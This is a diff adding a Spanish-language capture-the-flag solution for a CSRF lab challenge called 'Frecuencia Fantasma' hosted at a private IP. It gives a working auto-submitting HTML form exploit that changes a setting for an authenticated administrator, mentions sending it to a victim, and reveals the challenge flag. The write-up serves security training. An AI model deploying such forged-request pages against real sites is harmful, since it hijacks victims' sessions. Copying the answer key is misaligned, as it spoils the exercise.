@@ -1,0 +1,27 @@
+=========================================
+SOLUCIONARIO RETO 9 - CSRF
+=========================================
+Título: Frecuencia Fantasma
+URL: http://192.168.70.43:5009
+Vulnerabilidad: Cross-Site Request Forgery (CSRF)
+
+PASOS PARA LA EXPLOTACIÓN:
+1. Analizamos la petición de cambio de frecuencia. Es un formulario POST con el parámetro 'frecuencia'.
+2. Notamos que no existe un token anti-CSRF (como 'csrf_token') en el HTML.
+3. El objetivo es que un usuario autenticado (el administrador) ejecute una acción que nosotros definamos.
+4. Creamos un archivo HTML malicioso (exploit.html) localmente:
+   <html>
+     <body>
+       <form action="http://192.168.70.43:5009/" method="POST" id="csrf-form">
+         <input type="hidden" name="frecuencia" value="CIBER-BOL" />
+       </form>
+       <script>document.getElementById('csrf-form').submit();</script>
+     </body>
+   </html>
+5. En un escenario real, enviaríamos este enlace a la víctima. 
+6. Al abrir el archivo mientras la sesión está activa en el puerto 5009, el formulario se envía automáticamente.
+7. Al regresar a la página original, veremos que la frecuencia ha cambiado a 'CIBER-BOL' y la FLAG ha sido revelada.
+firefox ~/retos-web/reto9/exploit.html
+
+FLAG OBTENIDA:
+COMANDO{CSRF_F0RG3RY_T4CT1C4L_BYP4SS}
